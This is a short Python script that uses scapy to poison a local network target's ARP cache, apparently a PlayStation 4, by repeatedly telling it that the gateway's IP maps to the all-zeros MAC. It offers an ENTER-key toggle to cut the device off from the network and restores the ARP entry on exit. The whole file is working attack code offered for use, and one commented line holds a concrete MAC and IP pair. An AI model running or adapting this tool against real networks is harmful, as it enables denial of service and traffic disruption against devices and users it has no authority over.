#!/usr/bin/env python3

VERBOSITY = 0

import os, sys, scapy.all as net
import atexit, threading, time

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
import get_machines

class ARPSpoof(threading.Thread):
	def __init__(self):
		super().__init__()
		self.machines = get_machines.search(ps4=True)
		self.spoof = False
		self.close = False
		atexit.register(self.restoreARP) #ensure that it can be cancelled

	def restoreARP(self):
		print("Restoring ARP")
		net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)

	def run(self):
		while not self.close:
			if self.spoof:
				#net.ARP(op="who-has", hwdst="00:d9:d1:6d:78:31", pdst="192.168.0.34", hwsrc="00:00:00:00:00:00", psrc="192.168.0.1")
				net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc="00:00:00:00:00:00", psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
			else:
				net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
			time.sleep(1)
		self.restoreARP()


if __name__ == "__main__":
	ON = "\x1b[32;1mON\x1b[0m "
	OFF = "\x1b[91mOFF\x1b[0m"

	network_thread = ARPSpoof()
	print(f"Target: {network_thread.machines['target'].ip} / {network_thread.machines['target'].mac}")
	try:
		print("Ready to poison ARP...")
		network_thread.start()
		while True:
			input(f"[ {ON if network_thread.spoof else OFF} ] - Press ENTER to toggle")
			network_thread.spoof = not network_thread.spoof
		network_thread.join()

	except KeyboardInterrupt:
		print("Closing...")

	except Exception as e:
		print(e)

	network_thread.close = True




